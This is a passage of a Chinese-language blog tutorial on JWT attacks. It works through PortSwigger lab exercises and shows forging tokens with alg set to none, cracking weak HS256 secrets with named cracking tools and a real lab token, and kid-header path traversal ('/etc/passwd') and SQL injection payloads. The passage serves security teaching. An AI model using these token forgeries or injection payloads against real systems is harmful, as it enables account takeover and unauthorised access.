string\">\"Hs256\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"typ\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"jwt\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"user\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"quan9i\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里我们指定<code>alg</code>为<code>None</code>，修改Payload中的<code>user</code>为<code>admin</code>，如下所示</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"alg\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"None\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"typ\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"jwt\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"user\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时再进行<code>Base64URL</code>编码，就可以实现越权，得到管理员才可以访问的界面。</p>\n<h3 id=\"靶场演示-3\"><a href=\"#靶场演示-3\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h3><p>靶场环境<a href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification\">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification</a><br>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验使用基于 JWT 的机制来处理会话。服务器未安全地配置为接受未签名的 JWT。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>要解决实验室问题，请修改您的会话令牌以获取对管理面板的访问权限/admin，然后删除用户carlos。</p></blockquote>\n<p>题目条件</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>您可以使用以下凭据登录到您自己的帐户：wiener:peter</p></blockquote>\n<p>进入环境后先去登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152814.png\" alt=\"在这里插入图片描述\"><br>得到JWT，题目提示了接受未签名的JWT，所以将第二个点后的内容直接删除，而后再对前面内容进行<code>Base64</code>解码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"kid\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"16adc077-c753-4bbe-a9df-46688c01ac46\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"alg\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"RS256\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"iss\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"portswigger\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sub\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"wiener\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"exp\"</span><span class=\"token operator\">:</span><span class=\"token number\">1669304815</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>修改<code>headers</code>中的<code>alg</code>为<code>none</code>，修改payload中的<code>sub</code>为<code>administrator</code>，然后分别进行<code>Base64URL</code>编码，即可得到新的JWT，在网站中对JWT进行替换，接下来再次访问此网站，发现新功能点。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152834.png\" alt=\"在这里插入图片描述\"><br>点进去发现有删除用户的功能<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152163.png\" alt=\"在这里插入图片描述\"><br>任务完成。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152228.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"爆破密钥\"><a href=\"#爆破密钥\" class=\"headerlink\" title=\"爆破密钥\"></a>爆破密钥</h2><p>这个的话其实就是使用工具来对密钥进行爆破，从而实现越权。<br>这个的话在参考过其他师傅的文章后发现是有一些条件的，具体如下所示</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">1</span>、JWT使用的加密算法是HS256加密算法\n<span class=\"token number\">2</span>、一段有效的、已签名的token\n<span class=\"token number\">3</span>、签名用的密钥不复杂（弱密钥）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>然后这里还需要介绍一下爆破密钥用的工具，链接如下<br><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a><br>安装方式如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/brendan-rius/c-jwt-cracker #下载</span>\n<span class=\"token number\">2</span>、make <span class=\"token comment\">#编译</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>使用方式如下 </p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>/jwtcrack JWT <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152297.png\" alt=\"在这里插入图片描述\"><br>这是一个，还有一个爆破工具，可以引用字典，链接如下<br><a href=\"https://github.com/Sjord/jwtcrack\">https://github.com/Sjord/jwtcrack</a><br>安装方式如下所示</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">1</span>、git clone https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span><span class=\"token class-name\">Sjord</span><span class=\"token operator\">/</span>jwtcrack \n<span class=\"token number\">2</span>、pip install <span class=\"token class-name\">PyJWT</span> tqdm<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>它的使用方式如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">python3 crackjwt<span class=\"token punctuation\">.</span>py JWT dictionary<span class=\"token punctuation\">.</span>txt <span class=\"token comment\">//字典文件是自己写入的</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"靶场演示-4\"><a href=\"#靶场演示-4\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h3><p>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验使用基于 JWT 的机制来处理会话。它使用极弱的密钥来签署和验证令牌。这可以很容易地使用一个包含常见secret的单词表来暴力破解。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>要解决实验室问题，请首先暴力破解网站的密钥。获得此后，使用它签署修改后的会话令牌，使您可以访问管理面板/admin，然后删除用户carlos</p></blockquote>\n<p>题目条件</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>您可以使用以下凭据登录到您自己的帐户：wiener:peter</p></blockquote>\n<p>进入环境后，依旧是先登录获取当前JWT<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152312.png\" alt=\"在这里插入图片描述\"><br>因为题目已经提示了这里用的是暴力破解，所以我们用刚刚提到的工具，来爆破一下密钥</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>/jwtcrack eyJraWQiOiIyZjRlMzM0Yy1lMzZjLTRhNWQtOWVjYi03ZDhkZDJhYThlYjMiLCJhbGciOiJIUzI1NiJ9<span class=\"token punctuation\">.</span>eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTMwNzYwNn0<span class=\"token punctuation\">.</span>iMBR0rqiUQKT1a1YoonpXNY5hCNz16okJB9tbog0QRE<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152373.png\" alt=\"在这里插入图片描述\"><br>这里爆破多次均未得到密钥，所以我们选择换另一个工具，自己找个字典来进行爆破<br>字典链接<a href=\"https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list\">https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</a><br>接下来使用工具指定字典来进行爆破</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">python3 crackjwt<span class=\"token punctuation\">.</span>py  eyJraWQiOiIyZjRlMzM0Yy1lMzZjLTRhNWQtOWVjYi03ZDhkZDJhYThlYjMiLCJhbGciOiJIUzI1NiJ9<span class=\"token punctuation\">.</span>eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTMwNzYwNn0<span class=\"token punctuation\">.</span>iMBR0rqiUQKT1a1YoonpXNY5hCNz16okJB9tbog0QRE dictionary<span class=\"token punctuation\">.</span>txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152460.png\" alt=\"在这里插入图片描述\">得到密钥为<code>secret1</code><br>进入解码网站<a href=\"https://jwt.io/\">https://jwt.io</a>,对jwt进行解码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152553.png\" alt=\"在这里插入图片描述\"><br>修改payload中的<code>sub</code>为<code>administrator</code>，再在下方写入密钥<code>secret1</code>，生成新JWT<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152705.png\" alt=\"在这里插入图片描述\"><br>拿到网站中替换原JWT，发现新功能点<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152752.png\" alt=\"在这里插入图片描述\">访问后发现可以删除用户<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152885.png\" alt=\"在这里插入图片描述\"><br>任务完成。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152952.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"Kid参数注入\"><a href=\"#Kid参数注入\" class=\"headerlink\" title=\"Kid参数注入\"></a>Kid参数注入</h2><p>前文在简述<code>Headers</code>提到，它还有一个可选参数<code>kid</code>，当<code>Headers</code>中存在这个参数时，我们可以通过修改这个参数实现目录遍历、SQL注入等攻击</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">#目录遍历\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"kid\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"/etc/passwd\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>Kid参数的逻辑是类似于<code>sql=&quot;select * from table where kid=$kid&quot;</code>这种，所以它是存在SQL注入漏洞的，示例如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">#sql注入\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"kid\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"0 union select 123\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时它的Kid就被我们恶意篡改为123，此时就相当于拿到了Key，可以伪造JWT，实现越权。</p>\n<h3 id=\"靶场演示-5\"><a href=\"#靶场演示-5\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h3><p>靶场地址<a href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal\">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal</a><br>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验使用基于 JWT 的机制来处理会话。为了验证签名，服务器使用JWTkid标头中的参数从其文件系统中获取相关密钥</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" 